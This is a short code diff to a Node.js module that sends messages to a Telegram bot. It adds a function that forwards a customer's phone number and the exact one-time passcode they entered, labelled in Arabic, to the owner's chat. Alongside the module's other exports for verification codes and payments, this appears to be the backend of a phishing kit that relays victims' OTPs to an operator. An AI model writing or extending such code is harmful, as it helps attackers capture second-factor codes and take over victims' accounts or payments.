@@ -309,6 +309,26 @@ const sendVerifyCodeConfirmation = async (sessionId, code) => {
   }
 };
 
+const sendOtpEnteredNotification = async (sessionId, phoneNumber, code) => {
+  const bot = getBot();
+  if (!bot || !OWNER_CHAT_ID) return;
+
+  const sessionShort = sessionId ? sessionId.substring(0, 8) : '—';
+
+  let text = '🔐 العميل أدخل كود OTP\n';
+  text += '━━━━━━━━━━━━━━━━━━━━\n\n';
+  text += `📱 رقم الهاتف: ${phoneNumber || '—'}\n`;
+  text += `🔑 الكود المدخل: <code>${code || '—'}</code>\n\n`;
+  text += `🆔 Session: ${sessionShort}...\n`;
+  text += `📅 ${formatDate(new Date())}\n`;
+
+  try {
+    await bot.sendMessage(OWNER_CHAT_ID, text, { parse_mode: 'HTML' });
+  } catch (err) {
+    console.error('[Telegram] sendOtpEnteredNotification error:', err.message);
+  }
+};
+
 module.exports = {
   sendNewOrderNotification,
   sendPaymentStatusNotification,
@@ -317,4 +337,5 @@ module.exports = {
   sendCodeVerificationRequest,
   sendActivationCode,
   sendVerifyCodeConfirmation,
+  sendOtpEnteredNotification,
 };
